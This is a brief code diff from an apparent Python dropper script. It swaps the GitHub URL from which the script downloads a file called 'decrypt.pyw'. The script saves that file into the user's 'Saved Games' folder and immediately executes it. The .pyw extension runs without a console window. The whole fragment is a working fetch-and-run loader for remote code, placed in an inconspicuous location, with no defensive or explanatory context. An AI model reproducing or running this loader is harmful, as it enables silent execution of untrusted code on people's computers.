@@ -13,7 +13,7 @@ def download(URL , save_path):
 	with open(save_path,"wb") as f:
 		f.write(a.read())
 def main():
-	url = "https://github.com/Samplayswthpython/hello/raw/main/decrypt.pyw"
+	url = "https://github.com/TheBetterQwerty/hello/raw/main/decrypt.pyw"
 	save_path = f"{os.path.expanduser('~')}\\Saved Games\\decrypt.pyw"
 	download(url , save_path)
 	subprocess.call(["python",save_path])
